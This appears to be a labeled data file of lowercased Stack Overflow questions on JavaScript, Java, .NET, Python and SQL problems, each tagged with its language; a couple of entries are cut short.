queryselectorall() with regex attribute selector <pre><code>var arr = [].slice.call(document.queryselectorall( a[href*= pricing ] )); </code></pre>   returns an array with length 6.   <pre><code>var arr = [].slice.call(document.queryselectorall( a[href*= tarification ] )); </code></pre>   also produces an array of length 6.    the context is a website with either english or french pages. either of the two versions or arr will return 6 results on a given page while the other will produce an empty array.    i would like to dynamically account for this. so regardless if the user is on a french or english page i know that one or the other versions will return 6 elements. i could write an <code>if()</code> statement. but is there a neater  shorter way  i tried the following:   <pre><code>var arr = [].slice.call(document.queryselectorall( a[href*= (tarification|pricing) ] )); </code></pre>   but that also returned an empty array.,javascript

fastest way to find an item in a sorted arraylist  in java  i have an arraylist with a list of objects. each object has a date field that is just a long data type. the arraylist is sorted by the date field. i want to insert a new object into the arraylist so that it appears in the correct position with regard to its date. the only solution i can see is to iterate through all the items and compare the date field of the object being inserted to the objects being iterated on and then insert it once i reach the correct position. this will be a performance issue if i have to insert a lot of records.    what are some possible ways to improve this performance  maybe an arraylist is not the best solution,java

typeloadexception in com library  i have a class library that has a class  messagegroupinfo  that contains some string and bool properties. no methods. i use this class to pass info to a constructor of another class  messagegrouper.     these are used by a com visible class library that is an add-in to another app. both the add-in assembly and the class library use .net 4 client targets.     when i call a method that uses messagegrouper (and thus messagegroupinfo)  i get a typeloadexception. it can t find messagegroupinfo.  i know it has resolved and loaded the class library because other code in that assembly is working just fine.     i setup a quick winform app to see if it had an issue  but it worked fine.     this problem originally occurred on a 64bit win7 box. it works fine on a xp 32bit box.    so  could this be a 64 bit thing or a com-64bit thing   is there some setting i m missing  not that otherwise the add-in works well  calling many other methods in the class library.     thanks!,.net

best practice for hacking on a 3rd-party python module  i often find myself wanting to use a 3rd party python module in my own project  but i know that i will also need to make changes to the 3rd party module that i want to push upstream. what is the best practice of file layout/installation to achieve this     most python modules are laid out with root dir containing a  setup.py  to compile/install the module. the problem is  every time i make changes to the module source i need to re-run the full install step in order to use those changes in my project. for large modules  like scipy this can take some time.    alternatively  i can hack on the installed version of the python module  but then i have to manually move those changes back to the source version of the module in order to generate patches etc.    i know about virtualenv and pythonpath but they are ways of installing a module to a different location.    so far  i have manually created symlinks  but that is messy.,python

in job postings  what is .net programming   my latest contract project successfully concluded a couple of weeks ago  and i ve been pounding the job sites looking for new work. it s been six or seven years since i last <i>really</i> looked at these sites  so maybe the phrase   .net programmer   or variants  has come to mean something. but  danged if i know what!    my primary language is c#. when developing web functionality  i use that along with asp.net  javascript  html  and css. so  from my perspective  i have over six years of experience as a  .net programmer.  employers  or at least their hr departments  however  don t see it that way.     during initial phone calls  in response to how much .net experience i have  i ll say six years of c# and asp.net. in the majority of cases  the interviewer responds with   yeah  but how much direct .net programming   at that point  i know i m not going to get a substantive interview  because the screener and i aren t speaking the same language.    to me  .net comprises the framework and the common language runtime. i am doing .net programming when i use some language  in my case c#  to make use of the framework to create an application  utility  or some web-functionality. and  the code i write runs in the clr. if  .net programming  means something beyond that  then i think of developing/updating the framework classes and the clr. so far as i know  however  that work is ms s exclusive domain. (not speaking  of course  of inheritance  extension  overriding  etc.)     so  if not c# (or vb  j#  etc.) and asp.net  what does  .net programming  mean      any thoughts greatly appreciated.,.net
communication between local database and centralized database  i have to develop a c# .net windows application for a client.the             database is sql server.our client has 18 offices in various countries.this desktop application will be instlled in all offices.there will be local database in all 18 offices and also there will be centralized database.    my questions are given below.    1) how can we move data from branch server to central server and also from central server to branch server     2)how faster and constant connection to database server is achived    also how can we achieve real time updates between all branches and central server     3)how mssql can sync with multiple servers in realtime over the      internet     4) can we achieve these things in a place where there is no internet connection,.net
selecting a date in the future  i am working on a shipment delivery report to determine if shipments are made within a shipment window.    every release has a ship_date value that is the date that the release must ship.  some releases though have a late window integer value that says if the shipment is made within x number of days then it is still considered on time.    this is complicated by another table which holds valid ship days for the month (used to exclude holidays  weekends  and such).   <pre><code>order_releases_table   part_no    quantity    ship_date    window  shipping_date   shipping_day </code></pre>   sample data   <pre><code>order_releases_table part_no  quantity  ship_date  window abc      100       9/1/2011   0 xyz      200       9/1/2011   2  shipping_date 9/1/2011 9/2/2011 9/5/2011 </code></pre>   so with this data part abc has to ship on 9/1 to be considered on time.  part xyz though can ship up to 2 days past 9/1 and still be considered on time  but since 9/3 isn t in our shipping days  then 9/5 is the last day it can ship and still be considered on time.    i think the answer lies in joining in a sub query of the shipping days table that assigns a row number to the shipping_day field.     <pre><code>select   row_number() over(order by shipping_date) as day_no    shipping_day from shipping_date where shipping_day &gt; ship_date  returns day_no  shipping_day 1       9/2/2011 2       9/5/2011 </code></pre>   then if i simply pick up the date where the day_no from this sub query is equal to window value from the release  i then have the last day a particular shipment can ship and still be considered on time.    i m having a hard time wrapping it all up in to the final query though.    is this the correct way to approach the problem,sql
if i get a site using client-side javascript  what will the site see as the requesting ip  my server or the client s   i m building an app where the user may occasionally make a search.  i d like to run the search through google  but i m unsure in the event i have many users if i will hit  google s search quota.  any individual user will not make more than one or two searches a day on the app.  but cumulatively  it could potentially be much more.    will doing client side retrival of a google query avoid this problem and not identify my server as the origin ip,javascript

loop until steady-state of a complex data structure in python  i have a more-or-less complex data structure (list of dictionaries of sets) on which i perform a bunch of operations in a loop until the data structure reaches a steady-state  ie. doesn t change anymore. the number of iterations it takes to perform the calculation varies wildly depending on the input.    i d like to know if there s an established way for forming a halting condition in this case. the best i could come up with is pickling the data structure  storing its md5 and checking if it has changed from the previous iteration. since this is more expensive than my operations i only do this every 20 iterations but still  it feels wrong.    is there a nicer or cheaper way to check for deep equality so that i know when to halt     thanks!,python
select data from sql db per day  i have a table with order information in an e-commerce store. schema looks like this:    [orders]<br> id|subtotal|taxamount|shippingamount|datecreated    <strong>this table does only contain data for every order. so if a day goes by without any orders  no sales data is there for that day.</strong>    i would like to select subtotal-per-day for the last 30 days  including those days with no sales.    the resultset would look like this:    date       | salessum<br> 2009-08-01 | 15235<br> 2009-08-02 | 0<br> 2009-08-03 | 340<br> 2009-08-04 | 0<br> ...      doing this  only gives me data for those days with orders:   <pre><code>select datecreated as date  sum(ordersubtotal) as salessum from orders group by datecreated </code></pre>   you could create a table called dates  and select from that table and join the orders table. but i really want to avoid that  because it doesn t work good enough when dealing with different time zones and things...    please don t laugh. sql is not my kind of thing... :),sql

time module and file changes  i need to write a script that does the following    write a python script to list all of the files and directories in the current directory and all subdirectories that have been modified in the last x minutes. x should be taken in as a command-line argument. check that this argument exists  and exit with a suitable error message if it doesn’t. x should be an int which is less than or equal to 120. if not  exit with a suitable error message. for each of these files and directories  list the time of modification  whether it is a file or directory  and its size.    i have come up with this    <pre><code>#!/usr/bin/python   import os sys time  total = len(sys.argv)  if total &lt; 2:     print  you need to enter a value in minutes      sys.exit()  var =  int(sys.argv[1])   if var &lt; 1 or var &gt; 120 :     print  the value has to be between 1 and 120      sys.exit() past = time.time() - var * 60  result = []  dir = os.getcwd()   for p  ds  fs in os.walk(dir):     for fn in fs:         filepath = os.path.join(p  fn)           status = os.stat(filepath).st_mtime         if os.path.getmtime(filepath) &gt;= past:             size = os.path.getsize(filepath)             result.append(filepath)             created = os.stat(fn).st_mtime              asciitime = time.asctime( time.gmtime( created ) )              print  files that have changed are %s %(result)             print  size of file is %s %(size) </code></pre>   so it reports back with something like this   <pre><code>files that have changed are [ /home/admin/python/osglob2.py ] size of file is 729 files that have changed are [ /home/admin/python/osglob2.py    /home/admin/python/endswith.py ] size of file is 285 files that have changed are [ /home/admin/python/osglob2.py    /home/admin/python/endswith.py    /home/admin/python/glob3.py ] size of file is 633 </code></pre>   how can i get this to stop reepeating the files,python

securing method access to a specific assembly  we re in .net 3.5. i would like to secure certain methods (or classes) in one assembly so that only another specific assembly can access it. lets call them <em>consumer</em> and <em>provider</em>    one way i know is by using <code>strongnameidentitypermissionattribute</code>. problem is that we don t sign our assemblies. signing it will make all hell break loose.     another way - is in code by using <code>assembly.getcallingassembly().fullname</code>. and verify name to match. with this  i have to code in each method  at least a call to a reusable method. ok.    and of course there is <code>internalsvisibleto</code> but this is not what we want to be based on.    is there another way how to implement something like this on the class level  or method level  preferably attribute-based  i mean by existing framework capability. i can develop my custom attributes - no doubt,.net
how can an object access its owner s global   if we have something like:    <strong>foo.py</strong>   <pre><code>from bar import bar  class foo:     global black;     black = true;      bar = bar()      bar.speak()  f = foo() </code></pre>   <strong>bar.py</strong>   <pre><code>class bar:     def speak():     if black:         print  blaaack!      else:         print  whitttte!  </code></pre>   when we run <code>python foo.py</code>    we get     <code>nameerror: global name  black  is not defined</code>    what s the best practise for doing something like this      should i pass it in the method      have the bar class have a parent variable      for context  in practise the <code>black</code> global is for a debugging step.,python
.net app not getting exe parameters when launched from web browser  i have a vb app that uses command line arguments.  i can run the app and it recognizes the args when i run it through a shortcut using  c:\myapp\myapp.exe -b: somesetting  -a: othersetting .  if i need to launch the app from html (such as html embedded email)  i create the link as:   <pre><code>&lt;a href= file:///c:\myapp\myapp.exe -b=somesetting&amp;-a=othersetting &gt;click here &lt;/a&gt; </code></pre>   it launches my app but doesn t pick up the arguments.  the vb code that grabs the arguments looks like:   <pre><code>dim args as string() = environment.getcommandlineargs() for cnt as integer = 1 to args.length - 1      select case args(cnt).substring(0  2).tolower         case  -b          do stuff         case  -a          do other stuff            setvar = args(cnt).substring(3)     end select  next </code></pre>   any one know how to grab the args when passed in from a url query  string i would appreciate help.,.net
calling another method into my class  i would like to implement a method that i use in another class in my project package.    the class that i would like to add the method to does not extend the class where the method comes from.    i ve tried:   <pre><code>mymethod p = new mymethod; </code></pre>   when i do this i get  cannot resolve symbol  mymethod,java
on an event fire a function immediately but wait x seconds untill it is able to run again   i have an event called customevent. when this event occurs i need to toggle a class on a div.     this is working however the event sometimes fires multiple times in quick succession. when this happens the class is added and removed again which is not what i want.    <pre><code>  $(document).on( customevent   function(event  data) {         $( .class ).toggleclass( toggle-class );   }); </code></pre>   when the event occurs i need the class to be immediately toggled. however i need the class to not be able to be toggled for 1 second even if the event continues to fire. the following is not working.    <pre><code>  var is_blocked;    $(document).on( customevent   function(event  data) {       if (is_blocked !== true) {         $( .class ).toggleclass( toggle-class );         is_blocked = true;         settimeout(function(){           is_blocked = false;          }  1000);       }   }); </code></pre>,javascript
pass arguments to console.log as first class arguments via proxy function  <code>console.log</code> takes an unspecified number of arguments and dumps their content in a single line.    is there a way i can write a function that passes arguments passed to it directly to <code>console.log</code> to maintain that behaviour  for example:   <pre><code>function log(){     if(console){         /* code here */     } } </code></pre>   this would not be the same as:   <pre><code>function log(){     if(console){         console.log(arguments);     } } </code></pre>   since <code>arguments</code> is an array and <code>console.log</code> will dump the contents of that array. nor will it be the same as:   <pre><code>function log(){     if(console){         for(i=0;i&lt;arguments.length;console.log(arguments[i]) i++);     } } </code></pre>   since that will print everything in different lines. the point is to maintain <code>console.log</code> s behaviour  but through a proxy function <code>log</code>.    +---    i was looking for a solution i could apply to all functions in the future (create a proxy for a function keeping the handling of arguments intact). if that can t be done however  i ll accept a <code>console.log</code> specific answer.,javascript

filewatcher created event  i am monitoring a folder with a .net filewatcher for certain kind of files(*.mbxml). i am using the created event of filewatcher for it. once the created event fires i have to move this file to another folder. the problem with this approach is that the created event is fired as soon as the file copying starts. so if the file is taking too long to copy to the folder being watched  the code that moves the file fails. i ve searched and the only solution i found on the net was that you move the file within a try-catch block and keep trying until the whole file is copied. i don t like this solution  it would ve been better if the created event was fired once the whole file had finished copying or there was a separate event for it. is there another way of achieving this,.net

is .net already the right way to go for small app development   i am developing a small windows app  but have some trouble deciding whether to use .net or not. as a coder i would like to make use of the .net libraries. on the other hand  requiring my users to download the gargantuan .net runtime seems like a horrible decision.    a 100 meg prerequisite might be alright for software in the scale of visual studio  but i feel like it would be a deal breaker for quick lightweight tools (think  for example  notepad++). in the future  the .net runtimes will likely become widespread enough to eradicate the problem  but in the short run  i feel uneasy.    in your opinion/experience  is 2009 too early for a small app to go .net  should i wait for the bigger players to pave the way     <em>edit: which versions  if any  come by default with xp sp2 and vista </em>,.net

when would you use object biginteger instead of simply using double   so i was given a problem telling me to make a table of factorials of integers up to number 30.  the book specifically tells me to use the object biginteger.

cross domain api call  i am trying to make a cross-domain api call in javascript.    i have tried angular s $http with jsonp but the api server does not support jsonp  only json. using jsonp i get an  unexpected token  error. fiddler shows the request was successful and gets the correct json object. is there a way to bypass the error and obtain what fiddler gets     as an alternative i tried cors with xmlhttprequest as described <a href= http://www.eriwen.com/javascript/how-to-cors/  rel= nofollow >here</a>. the request fails with the usual  no  access-control-allow-origin  header is present on the requested resource. . fiddler  however  shows that the request was successful with return code 200.    i don t understand this at all. why does fiddler say the return code was 200 but the cors call fails     also  i can access the api url from within my browser (firefox and chrome) without issues. the api is public and requires no authorization.,javascript

using javascript to copy text to clipboard  i know there are a couple of answers to this question but i am cross-eyed from looking at the multiplicity of choices. here s the problem i m trying to solve.     in a jquerymobile program the user performs a search. a listview of the results is presented. (there could be a lot). it turns out the names of the results in the listview could be used in another input field in the application. so my thought is to let them click an icon which would put the results displayed in the listview on the the clipboard so that when they go to the other page in the application they can just press ^c (or cmd-c on the mac) and the data will be loaded into the field.    i m basically looking for the simplest solution if anyone has any insight.,javascript

scanning and manipulating strings cardinal directions  i am creating a directed graph that represents a maze. one of the mechanics in the maze is to flip the direction of nodes. i am just reading the nodes from a file and i want to change the direction of node so it is opposite. by direction i mean n w s etc. however  my function does not work when using the string from the scanner and returns null when doing a system out. but does work when putting in a made up string  for example string test =  e  and then test = flipdirection(test). this sets test to  w . so i know that the flipdirection function and the string compares are valid. the output for the first line is  e  and then null.    <pre><code>public digraph(){      filereader reader = null;     scanner scan = null;       try {         reader = new filereader( input.txt );         scan = new scanner(reader);         scan.nextline();          while(scan.hasnextline()){              //read in unflipped nodes             int row = scan.nextint();             int col = scan.nextint();             char color = scan.next().charat(0);             string circle = scan.next();             string direction = scan.nextline();               //add a node to the graph             vertex v1 = new vertex(row  col  color  circle  direction);             addnode(v1);              //add a flipped node             system.out.println(direction);             direction = flipdirection(direction);             system.out.println(direction);             vertex v2 = new vertex(row  col  color  circle  direction);             addnode(v2);           }       } catch (filenotfoundexception e) {         system.out.println(e.getlocalizedmessage());     }  }   public static string flipdirection(string d){      string flip = null;       if(d.equals( n ))         flip =  s ;     if(d.equals( s ))         flip =  n ;     if(d.equals( e ))         flip =  w ;     if(d.equals( w ))         flip =  e ;     if(d.equals( nw ))         flip =  se ;     if(d.equals( se ))         flip =  nw ;     if(d.equals( ne ))         flip =  sw ;     if(d.equals( sw ))         flip =  ne ;     return flip; }  public class vertex {    //name of vertex and a pointer to the first node in its adj linked list  public int row; public int col; public char color; public string direction; public string iscircle;   public vertex(int row  int col  char color  string iscircle  string direction) {     super();     this.row = row;     this.col = col;     this.color = color;     this.iscircle = iscircle;     this.direction = direction; }  @override public string tostring() {     return  vertex [row=  + row +    col=  + col +    color=  + color             +    direction=  + direction +    iscircle=  + iscircle +  ] ; } </code></pre>   and this is what the input file looks like  without the extra spaces. the direction is the last part of text in each line   <pre><code>7 7  1 1 r n e  1 2 b n w  1 3 b n nw  1 4 r n nw  1 5 r n s </code></pre>,java

the best way for connecting multiple javascript applications/classes  i need to connect multiple javascript applications/class in a javascript framework .  in general  an application may need to notify another that an event has occurred  but does not need to wait for a response.     i would like to know if there are alternatives to <code> message queue </code> and <code> observer pattern </code>.  for example  which solution has been implemented in utility like google+  facebook  linkedin or other javascript frameworks      my case is an e-learning platform with over 10000 of users <br> the framework includes over 20 classes and a lot of listeners working in parallel.    this application consists of a single global object and all the other javascript classes are loaded and unloaded dynamically.    so  since all the classes/apps are visible from the global object i was thinking that a good option could be the following:    for each app:   <pre><code>myapp.prototype.open = function () {     this.events = {  myevent : this.onmyevent }     ... };  myapp.prototype.onmyevent = function (data) {    // do something }; </code></pre>   then the global object will be responsible to execute the function at apps level.    your comments and suggestions are welcome.,javascript

branched code and conflicting assembly versions....how to deal with this   i really hope this makes sense.  i ve tried just about everything i can think of  without any luck.    here s my situation:    there used to be a single code base that several teams were contributing to...but the goals and focuses of the teams started to diverge.  many months ago  it was decided to branch the code.    version a version b    the thing is  while a and b are now different  after months of independent changes - they still share a lot of logic  and  more relevant to my problem  class/interface/object names and namesspaces.    i work with version a.  we re trying to leverage something inside of version b.  version b wrote this very complex  difficult  time consuming thing that uses external libraries - but is now working great      it sounded easy.  version b has a project that encapsulates all this logic and all i need to do is add a reference to their assembly (.dll).  but there assembly is dependent of lots of other projects found in version b - that are <em>also</em> in version a - but it fails due to the numerous differences in a and b.  for example  the version b dll i add expects iinterface1 to have string x - but in version a there is an iinterface1 in the same namespace - but it already has an enum x.    all of the dlls end up getting copied to the /bin folder - i can t find a way to encapsulate one version to be used by project b s assembly.  i ve tried listening to the assemblyresolve event and directing it to a subfolder in /bin - but i can t understand how that will help me.  once i resolve the assembly once  it won t fire again  but i would need to redirect it more than once.    adding them both to the gac is not an option; but i think that might be the only reasonable way to do it.    can anyone give me some direction   would ilmerge be something i could use here,.net
.net serialisation different frameworks  there is an error very simple to reproduce when serializing and deserializing with different .net frameworks (framework 2 and 4). when i serialize a system.globalization.compareinfo with framework 2 and try to deserialize it with framework 4 there will be an overflowexception. the code is as follows:   <pre><code>private void button1_click(object sender  eventargs e) {     compareinfo ci = compareinfo.getcompareinfo( de-de );      stream stream = file.open( c:\\temp\\test.bin   filemode.create);     binaryformatter formatter = new binaryformatter();     formatter.assemblyformat = system.runtime.serialization.formatters.formatterassemblystyle.simple;     formatter.typeformat = system.runtime.serialization.formatters.formattertypestyle.xsdstring;     formatter.serialize(stream  ci);     stream.close(); }  private void button2_click(object sender  eventargs e) {     stream stream = file.open( c:\\temp\\test.bin   filemode.open);     binaryformatter formatter = new binaryformatter();     compareinfo ci = (compareinfo)formatter.deserialize(stream);     stream.close(); } </code></pre>   when i do this with the same version (2 or 4) it works as expected. when i save the file with framework 2 and try to open it with framework 4 i will get the overflowexception.  now i am looking for a workaround (since there are thousands of files writen with framework 2.0 at our customers). i tried an approach like in <a href= https://stackoverflow.com/questions/2174591/net-c-how-to-add-a-custom-serialization-attribute-that-acts-as-iserializable >how to add a custom serialization attribute that acts as iserializable interface</a> but with no success.  any ideas     i am sorry  i omitted the two lines that made may code crash:   <pre><code>  formatter.assemblyformat = system.runtime.serialization.formatters.formatterassemblystyle.simple;   formatter.typeformat = system.runtime.serialization.formatters.formattertypestyle.xsdstring; </code></pre>   because i thought they were not necessary. now i updated the code and it is crashing. it doesn t help to include these lines when reading the file.,.net

how to create a function in python that prints out uppercase words  i m absolutely new to programming with python but i m really willing to learn it. this community was highly suggested by my lecturer so i ll give it a try.    okay so i have a sentence with upper and lowercase words and i want to write a function that only prints out the words that start with an uppercase letter.     this is what i got so far:    <pre><code>s =    hey! hast du schon gesehen      wie einfach es ist  in python zu programmieren      es ist viel einfacher als on den meisten     anderen sprachen  die man so kennt.     def print_all_uppercased(s):     for word in s:         if word[0].isupper():             print word  print_all_uppercased(s) </code></pre>   thing is  this only prints out the single uppercase letters. where did i go wrong,python

how to update a column value incrementally  i m experimenting with a personal finance application  and i m thinking about what approach to take to update running balances when entering a transaction in an account.    currently the way i m using involves retrieving all records more recent than the inserted/modified one  and go one by one incrementing their running balance.    for example  given the following transactions:    t1 date = 2008-10-21  amount = 500  running balance = 1000    t2 date = 2008-10-22  amount = 300  running balance = 1300    t3 date = 2008-10-23  amount = 100  running balance = 1400 ...    now suppose i insert a transaction between t1 and t2  then t2 and all subsequent transactions would need their running balances adjusted.    hehe  now that i wrote this question  i think i know the answer... so i ll leave it here in case it helps someone else (or maybe there s even a better approach )    first  i get the running balance from the previous transaction  in this case  t1. then i update all following transactions (which would include the new one):   <pre><code>update transactions set running_balance = running_balance + &lt;amount&gt; where date &gt; &lt;t1.date&gt; </code></pre>   the only issue i see is that now instead of storing only a date  i ll have to store a time too. although  what would happen if two transactions had the exact same date/time     ps: i d prefer solutions not involving propietary features  as i m using both postgresql and sqlite... although a postgre-only solution would be helpful too.,sql

should sql format the output or just retrieve the raw data   generally speaking  the sql queries that i write return unformatted data and i leave it to the presentation layer  a web page or a windows app  to format the data as required. other people that i work with  including my boss  will insist that it is more efficient to have the database do it. i m not sure that i buy that and believe that even if there was a measurable performance gain by having the database do it  that there are more compelling reasons to generally avoid this.    for example  i will place my queries in a data access layer with the intent of potentially reusing the queries whenever possible. given this  i ascertain that the queries are more likely to be able to be reused if the data remains in their native type rather than converting the data to a string and applying formatting functions on them  for example  formatting a date column to a dd-mmm-yyyy format for display. sure  if the sql was returning the dates as formatted strings  you could reverse the process to revert the value back to a date data type  but this seems awkward  for lack of a better word. furtehrmore  when it comes to formatting other data  for example  a machine serial number made up of a prefix  base and suffix with separating dashes and leading zeros removed in each sub field  you risk the possibility that you may not be able to correctly revert back to the original serial number when going in the other direction. maybe this is a bad example  but i hope you see the direction i am going with this...    to take things a step further  i see people write very complex sqls because they are essentially writing what i would call presentation logic into a sql instead of returning simple data and then applying this presentation logic in the presentation layer. in my mind  this results in very complex  difficult to maintain and more brittle sql that is less adaptable to change.    take the following real-life example of what i found in our system and tell me what you think. the rational i was given for this approach was that this made the web app very simple to render the page as it used the following 1-line snippet of classic ado logic in a classic asp web app to process the rows returned:   <pre><code>     ors.getstring (      &lt;/td&gt;

   &amp;nbsp;  ) &amp;  &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;/tr&gt;  &amp; vbcrlf &amp; _ </code></pre>   here s the sql itself. while i appreciate the author s ability to write a complex sql  i feel like this is a maintenance nightmare. am i nuts  the sql is returning a list of programs that are current running against our database and the status of each:    because the sql did not display with cr/lfs when i pasted here  i decided to put the sql on an otherwise empty personal google site. please feel free to comment. thanks.    by the way-this sql was actually constructed using vb script nested within a classic asp page  not calling a stored procedure  so you have the additional complexity of embedded concatentations and quoted markup  if you know what i mean  not to mention lack of formatting. the first thing i did when i was asked to help to debug the sql was to add a debug.print of the sql output and throw it through a sql formatter that i just found. some of the formatting was lost in pasting at the following link:    edit(andomar): copied inline: (external link removed  thanks-chad)   <pre><code>select  substring(datename( dw  start_datetime) 1 3)  +      + cast(start_datetime as varchar)  start time (utc/gmt)   program_name  program name   run_sequence  run sequence   case  when batchno = 0 then char(160) when batchno = null then char(160) else cast(batchno as varchar) end  batch #  /*  replace(replace(detail_log   k:\    file://servernamehere/diskvolk/ )   \    / )  log */ /* */  cast( &lt;a href= gois_viewlog.asp program_name=  as varchar(99)) + cast(program_name as varchar) + cast( &amp;run_sequence=  as varchar) + cast(run_sequence as varchar) + cast( &amp;page=1  as varchar) +    + cast(  &gt;

java-reading a file  performance difference between byte and character streams  pretty simple question: what s the performance difference between a byte stream and a character stream     the reason i ask is because i m implementing level loading from a file  and initially i decided i would just use a byte stream for the purpose  because it s the simplest type  and  thus it should perform the best. but then i figured that it might be nice to be able to read and write the level files via a text editor instead of writing a more complex level editor (to start off with). in order for it to be legible by a text editor  i would need to use character streams instead of byte streams  so i m wondering if there s really any performance difference worth mentioning between the two methods  at the moment it doesn t really matter much since level loading is infrequent  but i d be interested to know for future reference  for instances where i might need to load levels from hard drive on the fly (large levels).,java

neither keylistener nor key bindings will handle multiple key events  i m trying to handle up to five concurrent keypressed events.    i have tried listening for keypressed and keyreleased events and adding/removing the keycodes from an arraylist respectively. this works for two keys  and sometimes three  however any more than that and no more keypressed events are registered until the keyreleased events occur for presently pressed keys:   <pre><code>import java.awt.event.keyevent; import java.awt.event.keylistener; import java.util.arraylist;  public class keyboardhandler implements keylistener { public static arraylist&lt;integer&gt; keys = new arraylist&lt;integer&gt;();  public void keytyped(keyevent e) {  }  public void keypressed(keyevent e) {      // system.out.println( key pressed:   + e.getkeycode());      if (!keys.contains((integer) e.getkeycode())) {         keys.add((integer) e.getkeycode());         // system.out.println( key added to keylist:   + e.getkeycode());     }   }  public void keyreleased(keyevent e) {     // system.out.println( key released:   + e.getkeycode());      if (keys.contains((integer) e.getkeycode())) {         keys.remove((integer) e.getkeycode());         // system.out.println( key removed from keylist:   + e.getkeycode());     } }  public static void handlekeyinput() { // i then go on to handle the items in the array list appropriately  //using this method that is called by a thread. </code></pre>   i arrived at the conclusion that this can t be anything to do with using the arraylist  so ended up looking into key binding. as i understand now  key binds are a much better way of handling key events. however  my problem remains  no more than three keys are ever registered as being pressed until the presently pressed keys are released:   <pre><code>import javax.swing.actionmap; import javax.swing.inputmap; import javax.swing.jcomponent; import javax.swing.keystroke;  import java.awt.event.actionevent; import java.awt.event.keyevent;  import javax.swing.abstractaction;  public class keybinding extends jcomponent{     public keybinding(){          inputmap im = this.getinputmap(when_in_focused_window);         actionmap am = getactionmap();          im.put(keystroke.getkeystroke(keyevent.vk_w  0  false)   w_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_w  0  true)   w_released );          im.put(keystroke.getkeystroke(keyevent.vk_a  0  false)   a_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_a  0  true)   a_released );          im.put(keystroke.getkeystroke(keyevent.vk_s  0  false)   s_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_s  0  true)   s_released );          im.put(keystroke.getkeystroke(keyevent.vk_d  0  false)   d_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_d  0  true)   d_released );          am.put( w_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( w key is pressed );             }           });          am.put( w_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( w key is released );             }           });          am.put( a_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( a key is pressed );             }           });          am.put( a_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( a key is released );             }           });          am.put( s_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( s key is pressed );             }           });          am.put( s_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( s key is released );             }           });          am.put( d_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( d key is pressed );             }           });          am.put( d_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println(  key is released );             }           });     } } </code></pre>   i m running eclipse on a mac  could it be some os specific bug or am i doing something totally wrong  i ve only been studying java for a couple of weeks and this has me stumped. i hate asking non-specific questions and just posting blocks of code - it seems lazy of me  but i ve tried and failed to solve this myself - all help is massively appreciated.,java

scanning a directory every 1 sec  if i want to monitor a directory in a .net server application running as a service  when would you say that the interval between the scan is  un-healty  for the server     i would like to scan the directory every 1 sec if i know the server can handle it well.    it is not an option of mine to use the file system watcher.    your experience is much appreciated.    update: the directory that is scanned will not have any sub dirs. the size of files is expected to be around 5kb to 500kb.    i would like to poll the directory when my application is ready to take on new data  so i don t think the file system watcher suits in this case. an option would of course be to save information about the files that the fsw triggers in a  pending list .,.net

second iteration doesn t work  the question i had to answer was:   <blockquote>    implement a function with signature   <pre><code>def expand_one_or(course_lists): </code></pre>       this function takes a list of lists of strings course_lists  and   modifies it as follows:       <ul>   <li> it finds the first list (call it lis) in course_lists in which  /  occurs. </li>   <li> it then finds the coordinate of the first  /  in lis (say i). </li>   <li> if lis[i-1] and lis[i+1] exist and are both courses  lis is replaced in course_lists with two new lists: a list identical to lis but with   lis[i] and lis[i+1] removed  and a list identical to lis but with   lis[i] and lis[i-1] removed. </li>   <li> otherwise  all that happens is that lis[i] is removed from lis. </li>   </ul>       for example  if course_lists is:   <pre><code>[ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>       expand_one_or finds the first  /   and modifies course_lists to become   <pre><code>[ [ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>       and if we run expand_one_or a second time on the resulting list  we   get   <pre><code>[ [ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc148h1         csc240h1    /    csc148h1    ;    / ] [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre> </blockquote>   the code i used to do this was:    <pre><code>c = [ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] d = [[ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]] def expand_one_or(course_lists):     accumulator = []     k = 0     for lis in course_lists:         for i in range(len(lis)):             if lis[i] ==  /  and i != len(lis) and k == 0:                 if lis[i - 1].isalnum() and lis[i + 1].isalnum():                     k = 1                     list1 = lis[:i] + lis[(i + 2):]                     list2 = lis[i + 1:]                     accumulator.append(list1)                     accumulator.append(list2)                  else:                     lis.remove(lis[i])                     k = 1     return accumulator </code></pre>   this code functions for the first iteration but doesn t work for the second one.    so for example if we give the function a list like:   <pre><code>[ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>   it should give the output    <pre><code>[[ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]] </code></pre>   now if we put this output code in the function again it should give:    <pre><code>[ [ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc148h1         csc240h1    /    csc148h1    ;    / ] [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>   the problem is when i run the function for the first time it gives me the proper output. however when i run it for the second time it gives me:   <pre><code>[[ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc240h1    /    csc148h1    ;    / ]] </code></pre>   and this is the wrong output.,python

